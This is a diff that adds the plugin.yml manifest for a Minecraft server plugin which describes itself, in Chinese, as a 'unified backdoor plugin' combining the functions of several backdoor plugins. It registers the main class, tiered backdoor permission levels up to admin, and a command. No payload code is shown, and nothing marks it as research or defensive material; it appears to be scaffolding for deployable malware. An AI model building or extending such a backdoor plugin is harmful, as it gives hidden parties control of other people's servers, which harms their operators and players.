@@ -1,0 +1,39 @@
+name: UnifiedBackdoor
+version: 1.0.0
+main: com.unifiedbackdoor.UnifiedBackdoorPlugin
+api-version: 1.13
+description: 统一Minecraft后门插件 - 整合多个后门插件功能
+author: UnifiedBackdoorTeam
+website: https://github.com/unifiedbackdoor
+
+# 权限节点
+permissions:
+  unifiedbackdoor.*:
+    description: 所有统一后门插件权限
+    children:
+      unifiedbackdoor.level1: true
+      unifiedbackdoor.level2: true
+      unifiedbackdoor.admin: true
+  
+  unifiedbackdoor.level1:
+    description: Level 1权限 - 基础命令访问
+    default: op
+  
+  unifiedbackdoor.level2:
+    description: Level 2权限 - 完整功能访问
+    default: op
+  
+  unifiedbackdoor.admin:
+    description: 管理员权限 - 配置和用户管理
+    default: op
+
+# 命令注册（用于权限检查）
+commands:
+  unifiedbackdoor:
+    description: 统一后门插件主命令
+    usage: /<command>
+    permission: unifiedbackdoor.level1
+    permission-message: "你没有权限使用此命令。"
+
+# 加载顺序
+load: POSTWORLD
